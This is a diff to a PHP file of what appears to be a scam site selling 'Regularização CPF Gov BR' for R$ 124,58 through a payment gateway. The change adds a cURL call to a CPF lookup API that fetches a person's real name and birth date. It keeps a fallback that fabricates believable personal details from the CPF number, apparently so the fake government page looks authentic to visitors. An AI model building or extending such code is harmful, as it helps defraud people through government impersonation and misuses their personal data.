@@ -12,10 +12,15 @@ define('VALOR_2025', 12458); // R$ 124,58
 // Nome do Produto a ser exibido no gateway
 define('PRODUTO_NOME', 'Regularização CPF Gov BR');
 
+// URL e Token da API de consulta de CPF real (se houver). 
+// Altere para a URL e Token do seu provedor.
+define('API_CONSULTA_URL', 'https://api.solucaocadastral.com/v1/cpf/'); // Exemplo de endpoint
+define('API_CONSULTA_TOKEN', ''); // Insira o token/chave da sua API aqui se necessário
+
 /**
- * Função para obter dados fictícios com base no CPF (apenas números).
- * Usa hash determinístico (crc32 + md5) para garantir resultados consistentes
- * em qualquer ambiente serverless, sem depender de srand/rand.
+ * Função para obter dados reais ou fictícios com base no CPF (apenas números).
+ * Tenta consultar uma API real configurada. Se falhar ou não estiver configurada,
+ * utiliza o gerador matemático determinístico baseado no CPF.
  */
 function obterDadosCPF($cpf_limpo) {
     // CPF de teste original
@@ -26,7 +31,48 @@ function obterDadosCPF($cpf_limpo) {
         ];
     }
 
-    // Listas para geração determinística
+    // 1. Tentativa de Consulta via API real se configurada
+    if (!empty(API_CONSULTA_TOKEN) || (defined('API_CONSULTA_URL') && API_CONSULTA_URL !== 'https://api.solucaocadastral.com/v1/cpf/')) {
+        try {
+            $url = API_CONSULTA_URL . $cpf_limpo;
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Timeout rápido de 5 segundos
+            
+            $headers = ['Content-Type: application/json'];
+            if (!empty(API_CONSULTA_TOKEN)) {
+                $headers[] = 'Authorization: Bearer ' . API_CONSULTA_TOKEN;
+            }
+            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+            
+            $response = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            
+            if ($http_code === 200 && !empty($response)) {
+                $dados_api = json_decode($response, true);
+                // Mapeamento comum de APIs de CPF (ajuste de acordo com o retorno da sua API)
+                $nome = $dados_api['nome'] ?? $dados_api['nome_completo'] ?? $dados_api['data']['nome'] ?? '';
+                $nasc = $dados_api['nascimento'] ?? $dados_api['data_nascimento'] ?? $dados_api['data']['nascimento'] ?? '';
+                
+                if (!empty($nome)) {
+                    // Se a data de nascimento vier no formato YYYY-MM-DD, converte para DD/MM/YYYY
+                    if (preg_match('/^\d{4}-\d{2}-\d{2}$/', $nasc)) {
+                        $nasc = date('d/m/Y', strtotime($nasc));
+                    }
+                    return [
+                        'nome'       => mb_convert_case($nome, MB_CASE_TITLE, 'UTF-8'),
+                        'nascimento' => $nasc ?: '01/01/1990'
+                    ];
+                }
+            }
+        } catch (Exception $e) {
+            // Se falhar a API, segue para o fallback determinístico
+        }
+    }
+
+    // 2. Fallback: Listas para geração determinística (se não configurada ou se falhar)
     $primeiros_nomes = [
         'José', 'Maria', 'João', 'Ana', 'Antônio', 'Francisco',
         'Carlos', 'Paulo', 'Lucas', 'Luiz', 'Marcos', 'Juliana',
